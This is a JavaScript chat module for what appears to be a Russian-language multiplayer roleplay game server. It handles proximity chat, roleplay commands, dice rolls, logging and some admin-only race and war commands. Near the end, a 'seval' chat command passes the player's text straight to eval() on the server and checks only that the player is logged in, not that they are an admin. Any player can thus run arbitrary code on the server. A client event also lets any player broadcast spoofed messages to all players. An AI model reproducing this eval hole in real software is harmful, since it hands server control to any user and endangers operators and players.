let user = require('../user');
let methods = require('./methods');

let fraction = require('../property/fraction');

let gangWar = require('../managers/gangWar');
let racer = require('../managers/racer');

let chat = exports;

let range = 15;

chat.clRed = '#f44336';
chat.clBlue = '#03A9F4';
chat.clOrange = '#FFC107';
chat.clWhite = '#FFFFFF';
chat.clBlack = '#000000';

chat.sendBCommand = function(player, text) {
    if (user.isLogin(player)) {

        mp.players.forEach(p => {
            if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
                p.outputChatBoxNew(`[${chat.getTime()}] !{2196F3} Игрок (${user.getSvId(player)}): !{FFFFFF}(( ${text} ))`);
        });

        methods.saveLog('log_chat', ['text'], [`/b ${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
    }
};

chat.sendTryCommand = function(player, text) {
    if (user.isLogin(player)) {

        let label = methods.getRandomInt(0, 2) === 0 ? 'Не удачно' : 'Удачно';

        mp.players.forEach(p => {
            if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA} ${label} ${user.getSvId(player)} ${text}`);
        });

        methods.saveLog('log_chat', ['text'], [`/try ${user.getRpName(player)} (${user.getId(player)}): ${label} ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
    }
};

chat.sendDoCommand = function(player, text) {
    if (user.isLogin(player)) {

        mp.players.forEach(p => {
            if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA} (( ${text} )) ${user.getSvId(player)}`);
        });
        methods.saveLog('log_chat', ['text'], [`/do ${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
    }
};

chat.sendMeCommand = function(player, text) {
    if (user.isLogin(player)) {

        mp.players.forEach(p => {
            if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
                p.outputChatBoxNew(`[${chat.getTime()}] !{C2A2DA}${user.getSvId(player)} ${text}`);
        });

        methods.saveLog('log_chat', ['text'], [`/me ${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
    }
};

chat.sendDiceCommand = function(player) {
    if (user.isLogin(player)) {
        let dice = methods.getRandomInt(1, 7);

        mp.players.forEach(p => {
            if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
                p.outputChatBoxNew(`[${chat.getTime()}] !{FF9800}[Игра в кости] !{C2A2DA}${user.getSvId(player)} бросил кости !{FF9800}(( Выпало ${dice} ))`);
        });

        methods.saveLog('log_chat', ['text'], [`/dice ${user.getRpName(player)} (${user.getId(player)}): Выпало ${dice}`]);
    }
};

chat.send = function(player, text) {
    if (user.isLogin(player)) {

        mp.players.forEach(p => {
            if (user.isLogin(p) && p.dimension === player.dimension && methods.distanceToPos(player.position, p.position) <= range)
                p.outputChatBoxNew(`[${chat.getTime()}] !{2196F3}Игрок (${user.getSvId(player)}) говорит:!{FFFFFF} ${text}`);
        });
        methods.saveLog('log_chat', ['text'], [`${user.getRpName(player)} (${user.getId(player)}): ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
    }
};

chat.sendPos = function(pos, range, sender, text, color = '2196F3') {

    mp.players.forEach(p => {
        if (user.isLogin(p) && methods.distanceToPos(pos, p.position) <= range)
            p.outputChatBoxNew(`[${chat.getTime()}] !{${color}} ${sender}:!{FFFFFF} ${text}`);
    });

    //mp.players.broadcastInRange(pos, range, `[${chat.getTime()}] !{${color}} ${sender}:!{FFFFFF} ${text}`);
};

chat.sendToAll = function(sender, text, color = '2196F3') {

    mp.players.forEach(p => {
        if (user.isLogin(p))
            p.outputChatBoxNew(`[${chat.getTime()}] !{${color}} ${sender}:!{FFFFFF} ${text}`);
    });

    methods.saveLog('log_chat', ['text'], [`ALL: ${methods.removeQuotes(methods.removeQuotes2(text))}`]);
    //mp.players.broadcast(`[${chat.getTime()}] !{${color}} ${sender}:!{FFFFFF} ${text}`);
};

chat.getTime = function() {
    let dateTime = new Date();
    return `${methods.digitFormat(dateTime.getHours())}:${methods.digitFormat(dateTime.getMinutes())}:${methods.digitFormat(dateTime.getSeconds())}`;
};

mp.events.add("server:chat:sendBCommand", function (player, text) {
    chat.sendBCommand(player, text);
});

mp.events.add("server:chat:sendTryCommand", function (player, text) {
    chat.sendTryCommand(player, text);
});

mp.events.add("server:chat:sendDoCommand", function (player, text) {
    chat.sendDoCommand(player, text);
});

mp.events.add("server:chat:sendMeCommand", function (player, text) {
    chat.sendMeCommand(player, text);
});

mp.events.add("server:chat:sendDiceCommand", function (player) {
    chat.sendDiceCommand(player);
});

mp.events.add("server:chat:send", function (player, text) {
    chat.send(player, text);
});

mp.events.add("server:chat:sendToAll", function (player, sender, text, color) {
    chat.sendToAll(sender, text, color);
});

mp.events.add("playerChat", function (player, text) {
    chat.send(player, text);
});

let gate = null;
mp.events.add('playerCommand', (player, command) => {

    try {
        if (command.toLowerCase().slice(0, 3) === "me ") {
            chat.sendMeCommand(player, command.substring(3));
        }
        else if (command.toLowerCase().slice(0, 3) === "do ") {
            chat.sendDoCommand(player, command.substring(3));
        }
        else if (command.toLowerCase().slice(0, 4) === "try ") {
            chat.sendTryCommand(player, command.substring(4));
        }
        else if (command.toLowerCase().slice(0, 2) === "b ") {
            chat.sendBCommand(player, command.substring(2));
        }
        else if (command.toLowerCase().slice(0, 2) === "z ") {
            console.log(gangWar.isInZone(player, methods.parseInt(command.substring(2))));
        }
        else if (command.toLowerCase() === "p" || command.toLowerCase() === "netstat") {
            player.notify("~g~Ping: " + player.ping + "ms\n~g~PacketLoss: " + player.packetLoss + "ms");
        }
        else if (command.toLowerCase() === "crimewar") {
            if (!user.isAdmin(player))
                return;
            fraction.createCargoWar();
        }
        else if (command.toLowerCase() === "racerc") {
            if (!user.isAdmin(player))
                return;
            racer.createRace();
        }
        else if (command.toLowerCase() === "racers") {
            if (!user.isAdmin(player))
                return;
            racer.startRace();
        }
        else if (command.slice(0, 6) === "seval ") {
            if (!user.isLogin(player))
                return;
            let evalCmd = command.substring(6);
            player.outputChatBoxNew(`SEval ${evalCmd}`);
            let result;
            try {
                result = eval(evalCmd);
                player.outputChatBoxNew(`SResult ${result}`);
            } catch (e) {
                result = e;
                player.outputChatBoxNew(`SResult ${result}`);
            }
        }
        else {
            // TODO player.outputChatBoxNew(`!{FFC107}На сервере нет команд, кроме: /me, /do, /try, /b. Используйте меню на кнопку M`);
        }
    }
    catch (e) {
        methods.debug(e);
    }
});